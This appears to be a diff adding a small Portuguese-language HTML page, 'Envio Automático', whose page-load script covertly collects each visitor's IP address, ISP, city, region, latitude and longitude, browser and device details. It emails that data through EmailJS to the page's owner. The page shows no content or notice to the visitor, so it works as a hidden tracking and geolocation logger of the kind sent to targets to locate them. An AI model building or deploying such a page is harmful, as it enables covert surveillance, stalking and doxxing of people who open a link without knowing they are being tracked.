@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<title>Envio Automático</title>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body>
+<script>
+emailjs.init("1q8wVxRr-MHM3y_30");
+
+window.onload = async () => {
+  // Coleta IP simples
+  let infoBasica = {};
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    infoBasica = {
+      ip: ipData.ip,
+      navegador: navigator.userAgent,
+      sistema: navigator.platform,
+      resolucao: `${screen.width}x${screen.height}`,
+      idioma: navigator.language,
+      fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      hora: new Date().toLocaleString()
+    };
+  } catch {}
+
+  // Coleta IP detalhado via API
+  let infoDetalhada = {};
+  try {
+    const detalhadoRes = await fetch('https://ipapi.co/json/');
+    const detalhadoData = await detalhadoRes.json();
+    infoDetalhada = {
+      ip: detalhadoData.ip || "",
+      cidade: detalhadoData.city || "",
+      regiao: detalhadoData.region || "",
+      operadora: detalhadoData.org || "",
+      pais: detalhadoData.country_name || "",
+      latitude: detalhadoData.latitude || "",
+      longitude: detalhadoData.longitude || "",
+      navegador: navigator.userAgent,
+      sistema: navigator.platform,
+      resolucao: `${screen.width}x${screen.height}`,
+      idioma: navigator.language,
+      fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      hora: new Date().toLocaleString()
+    };
+  } catch {}
+
+  // Envia pelo EmailJS
+  const templateParams = {
+    ip_simples: infoBasica.ip,
+    ip_detalhado: infoDetalhada.ip,
+    cidade: infoDetalhada.cidade,
+    regiao: infoDetalhada.regiao,
+    operadora: infoDetalhada.operadora,
+    pais: infoDetalhada.pais,
+    latitude: infoDetalhada.latitude,
+    longitude: infoDetalhada.longitude,
+    navegador: infoDetalhada.navegador,
+    sistema: infoDetalhada.sistema,
+    resolucao: infoDetalhada.resolucao,
+    idioma: infoDetalhada.idioma,
+    fusoHorario: infoDetalhada.fusoHorario,
+    hora: infoDetalhada.hora
+  };
+
+  emailjs.send("service_nb66cci", "template_1caiksa", templateParams);
+};
+</script>
+</body>
+</html>
